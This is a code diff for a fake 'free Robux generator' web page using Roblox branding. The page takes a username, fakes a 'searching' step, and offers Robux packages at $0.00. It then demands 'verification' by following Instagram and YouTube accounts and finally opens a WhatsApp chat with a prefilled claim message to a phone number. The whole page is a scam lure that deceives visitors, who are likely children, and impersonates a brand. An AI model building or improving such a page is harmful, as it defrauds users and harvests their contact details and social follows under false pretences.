@@ -48,7 +48,8 @@
         nav {
             display: flex;
             justify-content: space-between;
-            padding: 0 40px;
+            align-items: center;
+            padding: 15px 40px;
             background-color: #181818;
             border-bottom: 1px solid #c7cbce;
         }
@@ -56,25 +57,43 @@
         .logo {
             display: flex;
             align-items: center;
+            gap: 10px;
         }
 
         .logo img {
             width: 30px;
         }
 
+        .logo span {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
         nav ul {
             list-style: none;
             display: flex;
+            gap: 30px;
+        }
+
+        nav ul li {
+            color: #ccc;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        nav ul li:hover,
+        nav ul li.active {
+            color: #00b06f;
         }
 
         .middle {
             width: 70%;
-            margin: 0 auto;
+            margin: 30px auto;
             height: 168px;
-            background-image: linear-gradient(0deg, rgba(39, 39, 46, 0.5), rgba(39, 39, 46, 0.5)), url(https://i.postimg.cc/6QysxXk0/bp.png);
-            background-position: bottom;
-            background-size: 100%;
-            margin-bottom: 24px;
+            background-image: linear-gradient(0deg, rgba(39, 39, 46, 0.5), rgba(39, 39, 46, 0.5)), url('/images/bp.png');
+            background-position: center;
+            background-size: cover;
+            border-radius: 12px;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -82,42 +101,68 @@
             text-align: center;
         }
 
+        .middle h2 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .middle p {
+            font-size: 16px;
+            opacity: 0.9;
+            max-width: 500px;
+        }
+
         .box_con {
             margin: 0 auto;
             background-color: #242424;
             min-height: 163px;
             width: 70%;
-            padding: 20px;
-            border-radius: 5px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
         }
 
         input {
-            padding: 12px 30px;
+            width: 100%;
+            padding: 15px 20px;
             border: none;
             background: #f2f4f5;
-            border-radius: 9px;
+            border-radius: 8px;
             outline: none;
-            font-size: 17px;
+            font-size: 16px;
+            margin-top: 15px;
         }
 
         button {
             background: #00b06f;
             border: none;
             color: #fff;
-            padding: 9px 31px;
-            border-radius: 5px;
-            font-weight: 500;
-            letter-spacing: 2px;
-            font-size: 19px;
+            padding: 12px 40px;
+            border-radius: 8px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 30px;
+            margin-top: 20px;
+            transition: all 0.3s;
         }
 
-        .box2, .box3, .box4 {
+        button:hover {
+            background: #009d5f;
+            transform: translateY(-2px);
+        }
+
+        .box2, .box3, .box4, .box5 {
             display: none;
         }
 
-        /* --- Start: Improved Loading Animation Styles --- */
+        h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #00b06f;
+        }
+
+        /* Loading Animation Styles */
         .folding {
             margin: 20px auto;
             width: 100px;
@@ -178,57 +223,152 @@
                 opacity: 0;
             }
         }
-        /* --- End: Improved Loading Animation Styles --- */
         
         .container {
             display: flex;
             flex-direction: column;
             border-radius: 8px;
+            gap: 1px;
+            background: #333;
         }
 
         .row {
             display: flex;
             align-items: center;
             height: 70px;
-            justify-content: space-around;
-            border-bottom: 1px solid #bdbebe;
+            justify-content: space-between;
+            padding: 0 20px;
+            background: #242424;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .row:hover {
+            background: #2a2a2a;
+            transform: translateX(5px);
+        }
+
+        .row:first-child {
+            border-radius: 8px 8px 0 0;
+        }
+
+        .row:last-child {
+            border-radius: 0 0 8px 8px;
         }
 
         .price {
             font-size: 20px;
             font-weight: 700;
+            color: #4caf50;
         }
 
         .robux_total {
             display: flex;
             align-items: center;
+            background-color: #00b06f;
+            color: white;
+            border-radius: 25px;
+            padding: 8px 15px;
+            min-width: 120px;
+            justify-content: center;
         }
 
         .pic {
-            width: 30px;
-            margin-right: 10px;
+            width: 25px;
+            margin-right: 8px;
         }
 
-        h3 {
-            font-size: 28px;
-            margin-bottom: 2px;
+        .robux_total span {
+            font-weight: 600;
         }
 
-        .details {
-            background-color: #00b06f;
+        .final-step {
+            text-align: center;
+        }
+
+        .final-step p {
+            margin: 20px 0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .whatsapp-btn {
+            background: #25d366;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
             color: white;
-            border-radius: 8px;
-            padding: 5px 8px;
-            width: 180px;
+            transition: all 0.3s;
+        }
+
+        .whatsapp-btn:hover {
+            background: #1da851;
+            transform: scale(1.05);
+        }
+
+        .tasks-container {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .task-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: #333;
+            border-radius: 8px;
+        }
+
+        .task-btn {
+            background: #007bff;
+            padding: 8px 20px;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .task-btn:hover {
+            background: #0056b3;
+        }
+
+        .verify-btn, .final-verify-btn {
+            background: #00b06f;
+            border: none;
+            color: #fff;
+            padding: 12px 40px;
+            border-radius: 8px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            font-size: 16px;
             cursor: pointer;
-            transition: 0.3s;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+
+        .verify-btn:hover, .final-verify-btn:hover {
+            background: #009d5f;
+            transform: translateY(-2px);
         }
 
         @media (max-width: 750px) {
             .middle, .box_con {
-                width: 100%;
+                width: 95%;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            
+            nav {
+                padding: 15px 20px;
+            }
+            
+            nav ul {
+                gap: 15px;
             }
         }
     </style>
@@ -238,11 +378,12 @@
     <nav>
         <div class="logo">
             <img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux Logo">
+            <span>ROBLOX</span>
         </div>
         <ul>
             <li>Discover</li>
             <li>Marketplace</li>
-            <li>Robux</li>
+            <li class="active">Robux</li>
         </ul>
     </nav>
 
@@ -252,11 +393,14 @@
     </div>
 
     <div class="box_con">
+        <!-- Step 1: Username Input -->
         <div class="box">
-            <h3>• Roblox username</h3>
+            <h3>• Roblox Username</h3>
             <input class="username" type="text" placeholder="Enter your username...">
             <button class="getrbx">Next</button>
         </div>
+
+        <!-- Step 2: Loading -->
         <div class="box2">
             <div class="folding">
                 <div class="sk-cube1 sk-cube"></div>
@@ -267,50 +411,68 @@
             </div>
             <p class="useroutput" style="text-align: center; margin-top: 30px;"></p>
         </div>
+
+        <!-- Step 3: Robux Selection -->
         <div class="box3">
+            <h3>• Choose Your Robux Package</h3>
             <div class="container">
-                <div class="row">
+                <div class="row" data-amount="500">
                     <div class="price">$0.00</div>
-                    <div class="details">
-                        <div class="robux_total">
-                            <div class="pic"><img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux"></div>
-                            <span>500</span>
-                        </div>
+                    <div class="robux_total">
+                        <img class="pic" src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux">
+                        <span>500</span>
                     </div>
                 </div>
-                <div class="row">
+                <div class="row" data-amount="10000">
                     <div class="price">$0.00</div>
-                    <div class="details">
-                        <div class="robux_total">
-                            <div class="pic"><img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux"></div>
-                            <span>10,000</span>
-                        </div>
+                    <div class="robux_total">
+                        <img class="pic" src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux">
+                        <span>10,000</span>
                     </div>
                 </div>
-                <div class="row">
+                <div class="row" data-amount="50000">
                     <div class="price">$0.00</div>
-                    <div class="details">
-                        <div class="robux_total">
-                            <div class="pic"><img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux"></div>
-                            <span>50,000</span>
-                        </div>
+                    <div class="robux_total">
+                        <img class="pic" src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux">
+                        <span>50,000</span>
                     </div>
                 </div>
-                <div class="row">
+                <div class="row" data-amount="100000">
                     <div class="price">$0.00</div>
-                    <div class="details">
-                        <div class="robux_total">
-                            <div class="pic"><img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux"></div>
-                            <span>100,000</span>
-                        </div>
+                    <div class="robux_total">
+                        <img class="pic" src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux">
+                        <span>100,000</span>
                     </div>
                 </div>
             </div>
         </div>
+
+        <!-- Step 4: Final Verification -->
         <div class="box4">
-            <h3>• Final Step</h3>
-            <p>Please click on the button below and complete 1 task to verify that you're not a robot!</p>
-            <button onclick="_bu()" style="background-color: #00b06f;">Verify now</button>
+            <div class="final-step">
+                <h3>• Final Step</h3>
+                <p>Please click on the button below and complete 1 task to verify that you're not a robot!</p>
+                <button class="verify-btn">Verify now</button>
+            </div>
+        </div>
+
+        <!-- Step 5: Tasks -->
+        <div class="box5" style="display: none;">
+            <div class="final-step">
+                <h3>• Complete Tasks</h3>
+                <p>Complete these tasks to verify you're human:</p>
+                <div class="tasks-container">
+                    <div class="task-item">
+                        <span>1. Follow our Instagram account</span>
+                        <button class="task-btn" onclick="window.open('https://instagram.com/robuxgenerator', '_blank')">Follow</button>
+                    </div>
+                    <div class="task-item">
+                        <span>2. Subscribe to our YouTube channel</span>
+                        <button class="task-btn" onclick="window.open('https://youtube.com/@robuxgenerator', '_blank')">Subscribe</button>
+                    </div>
+                </div>
+                <button class="final-verify-btn" style="margin-top: 20px;">I completed the tasks</button>
+            </div>
         </div>
     </div>
 
@@ -336,8 +498,14 @@
         const rbxbtn = document.querySelector(".getrbx");
         const usernameInput = document.querySelector(".username");
         const useroutput = document.querySelector(".useroutput");
+        const robuxRows = document.querySelectorAll(".row");
+        const verifyBtn = document.querySelector(".verify-btn");
+        const finalVerifyBtn = document.querySelector(".final-verify-btn");
         
-        // Ensure the browser allows sound playback
+        let selectedUsername = "";
+        let selectedRobuxAmount = "";
+
+        // Enable sound playback
         document.addEventListener("click", () => {
             sound.play().catch(() => {});
         }, { once: true });
@@ -354,11 +522,13 @@
             }, 4000);
         }
 
+        // Step 1 to Step 2: Username submission
         rbxbtn.addEventListener("click", () => {
             if (usernameInput.value.length <= 2) {
                 alert("Please enter a valid username.");
             } else {
-                useroutput.innerHTML = `Searching for <b>${usernameInput.value}</b> ...`;
+                selectedUsername = usernameInput.value;
+                useroutput.innerHTML = `Searching for <b>${selectedUsername}</b> ...`;
                 document.querySelector(".box").style.display = "none";
                 document.querySelector(".box2").style.display = "block";
                 setTimeout(() => {
@@ -368,6 +538,28 @@
             }
         });
 
+        // Step 3 to Step 4: Robux selection
+        robuxRows.forEach(row => {
+            row.addEventListener("click", () => {
+                selectedRobuxAmount = row.dataset.amount;
+                document.querySelector(".box3").style.display = "none";
+                document.querySelector(".box4").style.display = "block";
+            });
+        });
+
+        // Step 4 to Step 5: Show tasks
+        verifyBtn.addEventListener("click", () => {
+            document.querySelector(".box4").style.display = "none";
+            document.querySelector(".box5").style.display = "block";
+        });
+
+        // Step 5: Complete tasks and redirect to WhatsApp
+        finalVerifyBtn.addEventListener("click", () => {
+            const message = `Hello! I want to claim ${parseInt(selectedRobuxAmount).toLocaleString()} Robux for my Roblox account: ${selectedUsername}. I have completed all the verification tasks. Please process my request.`;
+            const whatsappUrl = `https://wa.me/6282145804242?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+        });
+
         // Show initial notification after 2 seconds
         setTimeout(showNotification, 2000);
         // Show notifications every 5 seconds
@@ -375,3 +567,5 @@
     </script>
 </body>
 </html>
+
+
